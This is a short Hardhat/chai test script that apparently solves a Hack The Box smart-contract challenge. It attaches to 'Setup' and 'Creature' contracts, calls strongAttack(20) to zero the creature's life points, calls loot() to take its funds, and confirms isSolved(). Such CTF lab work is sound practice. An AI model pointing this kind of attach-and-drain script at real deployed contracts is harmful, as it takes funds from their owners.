/*
    This script connect to the target and run the 
    functions needed to get the htb flag
*/

const { expect } = require('chai');
require('dotenv').config();

// .Env data to interact with the smart contracts
const {
    PRIV_KEY,
    ADDRESS,
    TARGET_ADDRESS,
    SETUP_ADDRESS
} = process.env;

// Smart contract names
const SETUP = 'Setup';
const TARGET = 'Creature';

describe("HTB flag flow :)", function () {

    let contractSetup;
    let contractTarget;

    it('[ Instantiate ] Setup.sol', async () => {

        const Contract = await hre.ethers.getContractFactory(SETUP);
        contractSetup = await Contract.attach(SETUP_ADDRESS);
        expect(contractSetup.target).to.be.equal(SETUP_ADDRESS);

    });

    it('[ Instantiate ] Creature.sol', async () => {

        const Contract = await hre.ethers.getContractFactory(TARGET);
        contractTarget = await Contract.attach(TARGET_ADDRESS);
        expect(contractTarget.target).to.be.equal(TARGET_ADDRESS);

    });

    it('[ Target ] Check the life before attack', async () => {

        const response = await contractTarget.lifePoints();
        console.log('Life points before => ', response);

    });

    it('[ Target ] Using the function "strongAttack"', async () => {

        const response = await contractTarget.strongAttack(20);
        expect(response.from).to.be.equal(ADDRESS);

    });

    it('[ Target ] Getting the loot, yeah boy :)', async () => {

        const response = await contractTarget.loot();
        expect(response.from).to.be.equal(ADDRESS);

    });

    it('[ Target ] Re-Check the life to be == 0', async () => {

        const response = await contractTarget.lifePoints();
        expect(response).to.be.equal(0);

    });

    it('[ Setup ] Checking if is solved', async () => {

        const response = await contractSetup.isSolved();
        console.log('Is solved ? : ', response);
        expect(response).to.be.equal(true);

    });

});
